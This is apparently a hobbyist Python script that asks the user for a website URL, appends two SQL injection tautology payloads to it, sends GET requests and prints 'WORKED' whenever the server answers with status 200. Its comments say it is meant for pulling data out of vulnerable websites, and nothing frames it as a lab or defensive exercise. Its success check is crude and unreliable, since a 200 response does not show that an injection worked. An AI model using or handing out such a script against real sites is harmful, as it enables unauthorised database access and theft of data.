import requests

# FIRST OF ALL CREATE A LIST OF SQL INJECTION PAYLOADS
# THIS SCRIPT IS ONLY FOR RETRIVAL OF DATA BY  SQL INJECTION VURNURABLE WEBSITES
payloads = ["'OR 1=1 -- ", "'OR 1-1=0 -- "]
# add as many as appropriate payloads you like
# ASK FOR URL
url = str(input("enter the Url of the vulnurable Website : "))


def Injection():
    print("INJECTING PAYLOADS....")
    for i in payloads:
        inject = requests.get(url + i)
        if inject.status_code == 200:
            print(url + i + " WORKED ")
        else:
            print("FAILED")


Injection()
